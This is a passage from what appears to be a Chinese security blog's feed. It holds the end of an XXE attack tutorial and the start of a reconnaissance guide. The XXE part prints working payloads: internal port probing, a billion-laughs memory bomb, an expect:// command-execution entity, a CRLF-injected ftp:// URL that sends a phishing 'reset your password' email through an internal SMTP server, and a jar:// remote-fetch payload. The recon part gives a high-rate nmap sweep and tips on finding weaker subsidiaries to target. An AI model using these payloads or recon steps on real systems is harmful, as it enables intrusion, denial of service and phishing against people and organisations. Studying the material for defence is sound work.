alt="image-20200724110415203"></p><p>然后服务器上面就能收到内容了</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/XXE/7.png" alt="image-20200724110442580"></p><p>解密下</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/XXE/8.png" alt="image-20200724110531774"></p><h4 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h4><p>相关语言可以使用的协议</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/XXE/9.png" alt="img"></p><p>使用以下POC来探测目标主机，所开的端口，也可以写个python脚本跑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">    &lt;!DOCTYPE ANY [</span><br><span class="line">        &lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;192.168.0.161:8000&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;123&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure><p>如果内网有服务会有响应，就算是无回显的XXE的话也会返回数据包过来</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/XXE/10.png" alt="image-20200724110702674"></p><p>如果内网无这个服务的话就会超时不会返回任何东西</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/XXE/11.png" alt="image-20200724110916397"></p><h4 id="DOS炸弹💣"><a href="#DOS炸弹💣" class="headerlink" title="DOS炸弹💣"></a>DOS炸弹💣</h4><p>之前有篇DOS炸弹的文章有讲过这是其中的一种XML的方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">  &lt;!DOCTYPE lolz [</span><br><span class="line">    &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line"> &lt;lolz&gt;&amp;lol9;&lt;&#x2F;lolz&gt;</span><br></pre></td></tr></table></figure><p>当XML解析器加载这个文档时，他会看到它包含一个包含文本<code>&amp;lol9;</code>的根元素,不过<code>&amp;lol9;</code>是一个定义的实体,扩展包含十个<code>&amp;lol8;</code>的字符串,每个<code>&amp;lol8;</code>是一个定义的实体，扩展为十个<code>&amp;lol7;</code>的字符串。因为许多XML解释器在解析XML文档时倾向于将它的整个结果保存在内存中，所以这个不到1kb的xml文件实际包含10亿个lol,占用几乎3GB的内存，造成DDOS攻击。</p><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>PHP环境下,xml命令执行要求php装有expect扩展。该扩展默认没有安装。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;except:&#x2F;&#x2F;ipconfig&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><h4 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h4><blockquote><p>该方法没有试验过，先看大佬文章记录下</p></blockquote><p>如果内网有一台易受攻击的 SMTP 服务器，我们就能利用 ftp:// 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼（一下实例来自fb 的一篇文章 ）</p><p>Java支持在sun.net.ftp.impl.FtpClient中的ftp URI。因此，我们可以指定用户名和密码，例如<a href="ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。">ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。</a></p><p>但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ftp:&#x2F;&#x2F;a%0D%0A</span><br><span class="line">EHLO%20a%0D%0A</span><br><span class="line">MAIL%20FROM%3A%3Csupport%40VULNERABLESYSTEM.com%3E%0D%0A</span><br><span class="line">RCPT%20TO%3A%3Cvictim%40gmail.com%3E%0D%0A</span><br><span class="line">DATA%0D%0A</span><br><span class="line">From%3A%20support%40VULNERABLESYSTEM.com%0A</span><br><span class="line">To%3A%20victim%40gmail.com%0A</span><br><span class="line">Subject%3A%20test%0A</span><br><span class="line">%0A</span><br><span class="line">test!%0A</span><br><span class="line">%0D%0A</span><br><span class="line">.%0D%0A</span><br><span class="line">QUIT%0D%0A</span><br><span class="line">:a@VULNERABLESYSTEM.com:25</span><br></pre></td></tr></table></figure><p>当FTP客户端使用此URL连接时，以下命令将会被发送给VULNERABLESYSTEM.com上的邮件服务器：</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ftp:&#x2F;&#x2F;a</span><br><span class="line">EHLO a</span><br><span class="line">MAIL FROM: &lt;support@VULNERABLESYSTEM.com&gt;</span><br><span class="line">RCPT TO: &lt;victim@gmail.com&gt;</span><br><span class="line">DATA</span><br><span class="line">From: support@VULNERABLESYSTEM.com</span><br><span class="line">To: victim@gmail.com</span><br><span class="line">Subject: Reset your password</span><br><span class="line">We need to confirm your identity. Confirm your password here: http:&#x2F;&#x2F;PHISHING_URL.com</span><br><span class="line">.</span><br><span class="line">QUIT</span><br><span class="line">:support@VULNERABLESYSTEM.com:25</span><br></pre></td></tr></table></figure><p>这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件。</p><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><blockquote><p>该方法没有试验过，先看大佬文章记录下</p></blockquote><p><strong>jar:// 协议的格式：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:&#123;url&#125;!&#123;path&#125;</span><br></pre></td></tr></table></figure><p><strong>实例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jar:http:&#x2F;&#x2F;host&#x2F;application.jar!&#x2F;file&#x2F;within&#x2F;the&#x2F;zip</span><br><span class="line"></span><br><span class="line">这个 ! 后面就是其需要从中解压出的文件</span><br></pre></td></tr></table></figure><p>jar 能从远程获取 jar 文件，然后将其中的内容进行解压，等等，这个功能似乎比 phar 强大啊，phar:// 是没法远程加载文件的</p><p><strong>jar 协议处理文件的过程：</strong></p><p>(1) 下载 jar/zip 文件到临时文件中<br>(2) 提取出我们指定的文件<br>(3) 删除临时文件</p><blockquote><p><strong>那么我们怎么找到我们下载的临时文件呢？</strong></p><p>因为在 java 中 file:/// 协议可以起到列目录的作用，所以我们能用 file:/// 协议配合 jar:// 协议使用</p></blockquote><p>大概的payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY  remote SYSTEM &quot;jar:http:&#x2F;&#x2F;localhost:9999&#x2F;jar.zip!&#x2F;wm.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;convert&gt;&amp;remote;&lt;&#x2F;convert&gt;</span><br></pre></td></tr></table></figure><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;3357</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>信息收集总结</title>
    <link href="https://www.ascotbe.com/2020/07/23/InformationGathering/"/>
    <id>https://www.ascotbe.com/2020/07/23/InformationGathering/</id>
    <published>2020-07-23T13:45:42.000Z</published>
    <updated>2021-05-17T00:32:35.016Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>对没错这是这星期的第三篇文章了，目前只写了个GitHub的使用方法，等周六周天补充吧</p><h2 id="Github搜索语法"><a href="#Github搜索语法" class="headerlink" title="Github搜索语法"></a>Github搜索语法</h2><p>众所周知，GitHub就是信息泄露的宝库之一，用好语法天天高危来敲你家门（逃</p><h3 id="相关语法"><a href="#相关语法" class="headerlink" title="相关语法"></a>相关语法</h3><h4 id="查询大于或小于另一个值的值"><a href="#查询大于或小于另一个值的值" class="headerlink" title="查询大于或小于另一个值的值"></a>查询大于或小于另一个值的值</h4><p>您可以使用<code>&gt;</code>，<code>&gt;=</code>，<code>&lt;</code>，和<code>&lt;=</code>搜索是大于，大于或等于，小于和小于或等于另一个值的值。</p><table><thead><tr><th>查询</th><th>示例</th></tr></thead><tbody><tr><td><code>&gt;n</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+stars:%3E1000&type=Repositories">cats stars:&gt;1000</a></strong> 匹配含有 “cats” 字样、星标超过 1000 个的仓库。</td></tr><tr><td><code>&gt;=n</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+topics:%3E=5&type=Repositories">cats topics:&gt;=5</a></strong> 匹配含有 “cats” 字样、有 5 个或更多主题的仓库。</td></tr><tr><td><code>&lt;n</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+size:%3C10000&type=Code">cats size:&lt;10000</a></strong> 匹配小于 10 KB 的文件中含有 “cats” 字样的代码。</td></tr><tr><td><code>&lt;=n</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+stars:%3C=50&type=Repositories">cats stars:&lt;=50</a></strong> 匹配含有 “cats” 字样、星标不超过 50 个的仓库。</td></tr><tr><td><code>n..*</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+stars:10..*&type=Repositories">cats stars:10..*</a></strong> 等同于 <code>stars:&gt;=10</code> 并匹配含有 “cats” 字样、有 10 个或更多星号的仓库。</td></tr><tr><td><code>*..n</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+stars:%22*..10%22&type=Repositories">cats stars:*..10</a></strong> 等同于 <code>stars:&lt;=10</code> 并匹配含有 “cats” 字样、有不超过 10 个星号的仓库。</td></tr></tbody></table><h4 id="查询范围之间的值"><a href="#查询范围之间的值" class="headerlink" title="查询范围之间的值"></a>查询范围之间的值</h4><p>您可以使用范围语法 <code>n..n</code> 搜索范围内的值，其中第一个数字 <em>n</em> 是最低值，而第二个是最高值。</p><table><thead><tr><th>查询</th><th>示例</th></tr></thead><tbody><tr><td><code>n..n</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+stars:10..50&type=Repositories">cats stars:10..50</a></strong> 匹配含有 “cats” 字样、有 10 到 50 个星号的仓库。</td></tr></tbody></table><h4 id="查询日期"><a href="#查询日期" class="headerlink" title="查询日期"></a>查询日期</h4><p>您可以通过使用 <code>&gt;</code>、<code>&gt;=</code>、<code>&lt;</code>、<code>&lt;=</code> 和范围查询搜索早于或晚于另一个日期，或者位于日期范围内的日期。 日期格式必须遵循 <a href="http://en.wikipedia.org/wiki/ISO_8601">ISO8601</a>标准，即 <code>YYYY-MM-DD</code>（年-月-日）。</p><table><thead><tr><th>查询</th><th>示例</th></tr></thead><tbody><tr><td><code>&gt;YYYY-MM-DD</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+created:%3E2016-04-29&type=Issues">cats created:&gt;2016-04-29</a></strong> 匹配含有 “cats” 字样、在 2016 年 4 月 29 日之后创建的议题。</td></tr><tr><td><code>&gt;=YYYY-MM-DD</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+created:%3E=2017-04-01&type=Issues">cats created:&gt;=2017-04-01</a></strong> 匹配含有 “cats” 字样、在 2017 年 4 月 1 日或之后创建的议题。</td></tr><tr><td><code>&lt;YYYY-MM-DD</code></td><td><strong><a href="https://github.com/search?q=cats+pushed:%3C2012-07-05&type=Code&utf8=%E2%9C%93">cats pushed:&lt;2012-07-05</a></strong> 匹配在 2012 年 7 月 5 日之前推送的仓库中含有 “cats” 字样的代码。</td></tr><tr><td><code>&lt;=YYYY-MM-DD</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+created:%3C=2012-07-04&type=Issues">cats created:&lt;=2012-07-04</a></strong> 匹配含有 “cats” 字样、在 2012 年 7 月 4 日或之前创建的议题。</td></tr><tr><td><code>YYYY-MM-DD..YYYY-MM-DD</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+pushed:2016-04-30..2016-07-04&type=Repositories">cats pushed:2016-04-30..2016-07-04</a></strong> 匹配含有 “cats” 字样、在 2016 年 4 月末到 7 月之间推送的仓库。</td></tr><tr><td><code>YYYY-MM-DD..</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+created:2012-04-30..*&type=Issues">cats created:2012-04-30..*</a></strong> 匹配在 2012 年 4 月 30 日之后创建、含有 “cats” 字样的议题。</td></tr><tr><td><code>..YYYY-MM-DD</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+created:*..2012-07-04&type=Issues">cats created:*..2012-04-30</a></strong> 匹配在 2012 年 7 月 4 日之前创建、含有 “cats” 字样的议题。</td></tr></tbody></table><p>您也可以在日期后添加可选的时间信息 <code>THH:MM:SS+00:00</code>，以便按小时、分钟和秒进行搜索。 这是 <code>T</code>，随后是 <code>HH:MM:SS</code>（时-分-秒）和 UTC 偏移 (<code>+00:00</code>)。</p><table><thead><tr><th>查询</th><th>示例</th></tr></thead><tbody><tr><td><code>YYYY-MM-DDTHH:MM:SS+00:00</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+created:2017-01-01T01:00:00+07:00..2017-03-01T15:30:15+07:00&type=Issues">cats created:2017-01-01T01:00:00+07:00..2017-03-01T15:30:15+07:00</a></strong> 匹配在 2017 年 1 月 1 日凌晨 1 点（UTC 偏移为 <code>07:00</code>）与 2017 年 3 月 1 日下午 3 点（UTC 偏移为 <code>07:00</code>）之间创建的议题。</td></tr><tr><td><code>YYYY-MM-DDTHH:MM:SSZ</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+created:2016-03-21T14:11:00Z..2016-04-07T20:45:00Z&type=Issues">cats created:2016-03-21T14:11:00Z..2016-04-07T20:45:00Z</a></strong> 匹配在 2016 年 3 月 21 日下午 2:11 与 2016 年 4 月 7 日晚上 8:45 之间创建的议题。</td></tr></tbody></table><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><p>您可以使用 <code>NOT</code> 语法排除包含特定字词的结果。 <code>NOT</code> 运算符只能用于字符串关键词， 不适用于数字或日期。</p><table><thead><tr><th align="left">查询</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left"><code>NOT</code></td><td align="left"><strong><a href="https://github.com/search?q=hello+NOT+world&type=Repositories">hello NOT world</a></strong> 匹配含有 “hello” 字样但不含有 “world” 字样的仓库。</td></tr></tbody></table><p>还可以使用包括<code>AND</code>、<code>OR</code>运算符</p><h4 id="排除运算符"><a href="#排除运算符" class="headerlink" title="排除运算符"></a>排除运算符</h4><p>缩小搜索结果范围的另一种途径是排除特定的子集。 您可以为任何搜索限定符添加 <code>-</code> 前缀，以排除该限定符匹配的所有结果。</p><table><thead><tr><th align="left">查询</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left"><code>-*QUALIFIER</code></td><td align="left"><strong><a href="https://github.com/search?q=cats+stars:%3E10+-language:javascript&type=Repositories">cats stars:&gt;10 -language:javascript</a></strong> 匹配含有 “cats” 字样、有超过 10 个星号但并非以 JavaScript 编写的仓库。</td></tr><tr><td align="left"></td><td align="left"><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=mentions:defunkt+-org:github&type=Issues">mentions:defunkt -org:github</a></strong> 匹配提及 @defunkt 且不在 GitHub 组织仓库中的议题</td></tr></tbody></table><h4 id="有空格的查询需使用引号"><a href="#有空格的查询需使用引号" class="headerlink" title="有空格的查询需使用引号"></a>有空格的查询需使用引号</h4><p>如果搜索含有空格的查询，您需要用引号将其括起来。 例如：</p><ul><li><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+NOT+%22hello+world%22&type=Repositories">cats NOT “hello world”</a> 匹配含有 “cats” 字样但不含有 “hello world” 字样的仓库。</li></ul><h4 id="包含运算符"><a href="#包含运算符" class="headerlink" title="包含运算符"></a>包含运算符</h4><table><thead><tr><th align="left">查询</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left"><code> in:file</code></td><td align="left"><code>cats in:file</code> 搜索文件中包含cats的代码</td></tr><tr><td align="left"><code>in:path</code></td><td align="left"><code>cats in:path</code> 搜索路径中包含cats的代码。<code>cats in:path,file</code> 搜索路径、文件中包含cats的代码</td></tr></tbody></table><h4 id="关键字总结"><a href="#关键字总结" class="headerlink" title="关键字总结"></a>关键字总结</h4><p><strong>pushed</strong>：在push中的代码中查找</p><p><strong>created</strong>：基于创建时间查找</p><p><strong>stars</strong>：基于star数量查找</p><p><strong>topics</strong>：基于标签数查找</p><p><strong>size</strong>：基于仓库文件数大小查找</p><p><strong>language</strong>：基于语言查找</p><p><strong>user</strong>：基于用户名查找</p><p><strong>org</strong>：基于组织搜索</p><p><strong>in</strong>：包含搜索</p><p><strong>repo</strong>：指定仓库搜索  <code>repo:USERNAME/REPOSITORY</code></p><p><strong>filename</strong>：基于文件名查找</p><p><strong>path</strong>：指定路径搜索 <code>cats path:app/public language:javascript </code> 搜索关键字cats，且语言为javascript，在app/public下的代码</p><p><strong>extension</strong>：指定扩展名搜索 <code>extension:properties jdbc</code></p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li>只能搜索小于384 KB的文件。</li><li>不支持长度超过 256 个字符的查询</li><li>您无法使用超过五个 <code>AND</code>、<code>OR</code> 或 <code>NOT</code> 运算符构造查询</li><li>只能搜索少于500,000个文件的存储库。</li><li>登录的用户可以搜索所有公共存储库。</li><li>除<code>filename</code>搜索外，搜索源代码时必须至少包含一个搜索词。例如，搜索<code>language:javascript</code>无效，而是这样：<code>amazing language:javascript</code>。</li><li>搜索结果最多可以显示来自同一文件的两个片段，但文件中可能会有更多结果。</li><li>您不能将以下通配符用作搜索查询的一部分：<code>. , : ; / \ &#39; &quot; = * ! ? # $ &amp; + ^ | ~ &lt; &gt; ( ) &#123; &#125; [ ]</code>。搜索将忽略这些符号。</li></ul><h2 id="搜索引擎搜索"><a href="#搜索引擎搜索" class="headerlink" title="搜索引擎搜索"></a>搜索引擎搜索</h2><p>这个就那几个语法，大家应该都会。</p><h2 id="APP收集"><a href="#APP收集" class="headerlink" title="APP收集"></a>APP收集</h2><h3 id="安卓"><a href="#安卓" class="headerlink" title="安卓"></a>安卓</h3><p>可以通过各大APP商店来搜索</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GooglePlay商店:https:&#x2F;&#x2F;developer.android.google.cn</span><br><span class="line">小米应用商店:http:&#x2F;&#x2F;app.mi.com&#x2F;</span><br><span class="line">豌豆荚:https:&#x2F;&#x2F;www.wandoujia.com&#x2F;</span><br><span class="line">豆瓣:https:&#x2F;&#x2F;www.douban.com&#x2F;app&#x2F;search</span><br><span class="line">华为应用市场:https:&#x2F;&#x2F;appgallery1.huawei.com</span><br><span class="line">360手机助手:http:&#x2F;&#x2F;zhushou.360.cn&#x2F;</span><br><span class="line">腾讯应用宝:http:&#x2F;&#x2F;android.myapp.com&#x2F;</span><br><span class="line">百度手机助手:https:&#x2F;&#x2F;sj.qq.com&#x2F;</span><br><span class="line">OPPO软件商店:https:&#x2F;&#x2F;store.oppomobile.com&#x2F;</span><br><span class="line">VIVO应用商店:https:&#x2F;&#x2F;dev.vivo.com.cn&#x2F;distribute&#x2F;appStore</span><br><span class="line">搜狗手机助手:http:&#x2F;&#x2F;zhushou.sogou.com&#x2F;</span><br><span class="line">PP助手:https:&#x2F;&#x2F;www.25pp.com&#x2F;android&#x2F;</span><br><span class="line">魅族应用中心: http:&#x2F;&#x2F;app.meizu.com&#x2F;</span><br><span class="line">乐商店:https:&#x2F;&#x2F;www.lenovomm.com&#x2F;</span><br><span class="line">安卓市场:http:&#x2F;&#x2F;apk.hiapk.com&#x2F;</span><br></pre></td></tr></table></figure><h3 id="IOS"><a href="#IOS" class="headerlink" title="IOS"></a>IOS</h3><p>直接在AppStore上搜索，这里有一个小技巧可以用在搜索上，如果安卓商店也有的话也能适用，这边就拿酷狗来试验</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/InformationGathering/1.png" alt="image-20200724172826427" style="zoom: 25%;" /><p>可以看到我们点进去这个APP后这是这样的，但是你们发现这边有一个开发者位置了吗</p><p>点击这个开发者按钮</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/InformationGathering/2.png" alt="image-20200724172949944" style="zoom:25%;" /><p>我们可以看到旗下的APP全在这边了是不是很方便，有些还会有子公司的APP在里面，比如子公司<strong>广州繁星互娱信息科技有限公司</strong>，然后依旧点进去开发者里面</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/InformationGathering/3.png" alt="image-20200724173222756" style="zoom:25%;" /><p>是不是发现又多了好多APP</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/InformationGathering/4.png" alt="image-20200724173330399" style="zoom:25%;" /><h2 id="公众号-amp-小程序收集"><a href="#公众号-amp-小程序收集" class="headerlink" title="公众号&amp;小程序收集"></a>公众号&amp;小程序收集</h2><p>这个方法就不一一举例了</p><p>微信：通过搜索来查小程序和公众号</p><p>支付宝：可以通过支付宝来搞一波看下有没有小程序</p><h2 id="公司信息收集"><a href="#公司信息收集" class="headerlink" title="公司信息收集"></a>公司信息收集</h2><p>有些人会问为啥要查询这些信息啊，公司信息和渗透有毛关系，因为有些子公司也会用母公司的API以及数据库之类的，但是子公司的安全意识不一定强，我们渗透不能头铁要找软柿子捏</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">企查查：https:&#x2F;&#x2F;www.qcc.com&#x2F;</span><br><span class="line">天眼查：https:&#x2F;&#x2F;www.tianyancha.com&#x2F;</span><br><span class="line">启信宝：https:&#x2F;&#x2F;www.qixin.com&#x2F;</span><br><span class="line">企查猫：https:&#x2F;&#x2F;www.qichamao.com&#x2F;</span><br><span class="line">神眼查：https:&#x2F;&#x2F;www.shenyancha.com&#x2F;</span><br></pre></td></tr></table></figure><p>这边就列举这几个，正常查询差不多不会有漏下的了，接下来就是把子公司的域名啥的搜集起来用工具跑子域名了</p><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><p>一些好的子域名收集项目，这几个目前我用起来还不错，其他的一些子域名项目好多都是几年没更新了，害</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;shmilylty&#x2F;OneForAll</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;laramies&#x2F;theHarvester</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;aboul3la&#x2F;Sublist3r</span><br></pre></td></tr></table></figure><h2 id="端口收集"><a href="#端口收集" class="headerlink" title="端口收集"></a>端口收集</h2><p>收集完子域名就可以批量扫描一波端口了</p><p>当需要扫描B端之类的IP的时候，创建一个文件<code>ip.txt</code>然后里面填IP段，运行下面的代码直接起飞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sS -Pn -n --min-hostgroup 500 --min-parallelism 2048 --host-timeout 30 -T4 -v -p 20,21,22,23,80,161,389,443,873,1025,1099,2222,2601,2604,3312,3311,4440,5900,5901,5902,7002,9000,9200,10000,50000,50060,50030,8080,139,445,3389,13389,7001,1521,3306,1433,5000,5432,27017,6379,11211,53,389 -iL ip.txt &gt;&gt; result.txt</span><br></pre></td></tr></table></figure><p>提取数据的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">&quot;2.txt&quot;</span>,<span class="string">&quot;a+&quot;</span>)</span><br><span class="line">lines = f.readlines()</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result1 = re.findall(<span class="string">r&#x27;Discovered open port (.*)/tcp&#x27;</span>, line)</span><br><span class="line">        result2 = re.findall(<span class="string">r&#x27;/tcp on (.*)&#x27;</span>, line)</span><br><span class="line">        print(result2[<span class="number">0</span>]+<span class="string">&quot;:&quot;</span>+result1[<span class="number">0</span>])</span><br><span class="line">        i=i+<span 